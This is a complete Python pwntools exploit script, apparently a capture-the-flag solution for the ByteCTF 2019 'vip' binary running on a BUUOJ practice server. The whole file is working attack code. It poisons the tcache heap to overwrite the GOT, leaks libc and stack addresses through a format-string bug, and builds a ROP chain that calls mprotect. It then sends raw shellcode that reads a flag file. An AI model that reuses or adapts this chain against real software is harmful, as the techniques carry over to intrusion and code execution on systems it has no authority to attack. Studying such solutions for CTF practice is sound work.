#!/usr/bin/python2.7  
# -*- coding: utf-8 -*-
from pwn import *
context.log_level = "debug"
context.arch = "amd64"
elf = ELF("bytectf_2019_vip")
sh = 0
lib = 0
def vip():
    sh.sendlineafter(":","6")
    sh.sendafter(':',flat('a'*0x20, 
    0x0000000000000020, 0x0000010101000015, 
    0x0005000000000006, 0x7fff000000000006,))
def add(idx):
    sh.recvuntil("Your choice:")
    sh.sendline("1")
    sh.sendlineafter(":",str(idx))
def free(idx):
    sh.sendlineafter("Your choice:","3")
    sh.sendlineafter(":",str(idx))
def show(idx):
    sh.sendlineafter("Your choice:","2")
    sh.sendlineafter(":",str(idx))
def edit(idx,size,content):
    sh.recvuntil("Your choice:")
    sh.sendline("4")
    sh.recvuntil(":")
    sh.sendline(str(idx))
    sh.sendlineafter(":",str(size))
    sh.recvuntil("Content:")
    sh.send(content)
def pwn(ip,port,debug):
    global sh
    global lib
    if(debug == 1):
        sh = process("./bytectf_2019_vip")
        lib = ELF("/lib/x86_64-linux-gnu/libc.so.6")
    else:
        sh = remote(ip,port)
        lib = ELF("/lib/x86_64-linux-gnu/libc.so.6")
    chunk_list = 0x404100
    vip()
    add(0)
    add(1)
    add(5)
    add(6)
    add(10)
    free(6)
    free(1)
    payload = 'a' * 0x50 + p64(0) + p64(0x61) + p64(elf.got['free'])
    edit(0,0x70,payload)
    add(1)
    add(2)
    show(2)
    free_addr = u64(sh.recvuntil("\x7f",False)[-6:].ljust(8,'\x00'))
    libc = free_addr - lib.symbols['free']
    system = libc + lib.symbols['system']
    execve = libc + lib.symbols['execve']
    printf = libc + lib.symbols['printf']
    mprotect = libc + lib.symbols['mprotect']
    edit(2,9,p64(printf))
    edit(10,8,"%8$p\x00")
    free(10)
    sh.recvuntil("0x")
    stack = int(sh.recvuntil("Done!",True),16) - 8 * 13
    payload  = p64(libc + lib.symbols['free'])
    payload += p64(libc + lib.symbols['puts'])
    payload += p64(libc + lib.symbols['__stack_chk_fail'])
    payload += p64(libc + lib.symbols['printf'])
    payload += p64(libc + lib.symbols['memset'])
    payload += p64(libc + lib.symbols['read'])
    payload += p64(libc + lib.symbols['prctl'])
    payload += p64(libc + lib.symbols['malloc'])
    payload += p64(libc + lib.symbols['setvbuf'])
    payload += p64(libc + lib.symbols['open'])
    payload += p64(libc + lib.symbols['perror'])
    payload += p64(libc + lib.symbols['atoi'])
    payload += p64(libc + lib.symbols['scanf'])
    payload += p64(libc + lib.symbols['exit'])
    payload = payload.ljust(0x4040a0 - 0x404018,'\x00')
    payload += p64(libc + lib.symbols['_IO_2_1_stdout_']) + p64(0)
    payload += p64(libc + lib.symbols['_IO_2_1_stdin_']) + p64(0)
    payload += p64(libc + lib.symbols['_IO_2_1_stderr_'])
    payload += p64(0) * 7
    payload += p64(stack)
    edit(2,0x500,payload)
    pop_rdx_ret = 0x1b96 + libc
    pop_rdi_ret = 0x4018fb
    pop_rsi_r15_ret = 0x4018f9
    base = 0x404000
    payload = p64(pop_rdi_ret) + p64(base)
    payload += p64(pop_rsi_r15_ret) + p64(0x1000) + p64(0)
    payload += p64(pop_rdx_ret) + p64(7)
    payload += p64(mprotect)
    payload += p64(pop_rdi_ret) + p64(0)
    payload += p64(pop_rsi_r15_ret) + p64(base + 0x800) + p64(0)
    payload += p64(pop_rdx_ret) + p64(0x500)
    payload += p64(libc + lib.symbols['read'])
    payload += p64(base + 0x800)
    edit(0,0x500,payload)
    sleep(0.2)
    payload = 'H\xb8\x01\x01\x01\x01\x01\x01\x01\x01PH\xb8.gm`f\x01\x01\x01H1\x04$H\x89\xe71\xd21\xf6j\x02X\x0f\x051\xc0j\x03_j@Z\xbe\x01\x01\x01\x01\x81\xf6\xa1AA\x01\x0f\x05j\x01_j@Z\xbe\x01\x01\x01\x01\x81\xf6\xa1AA\x01j\x01X\x0f\x05'
    sh.sendline(payload)
    log.success("libc: " + hex(libc))
    log.success("stack: " + hex(stack))
    log.success("system: " + hex(system))
    if(debug == 1):
        log.success("pid: " + str(sh.pid))
    sh.interactive()
if __name__ == "__main__":
    pwn("node3.buuoj.cn",28324,0)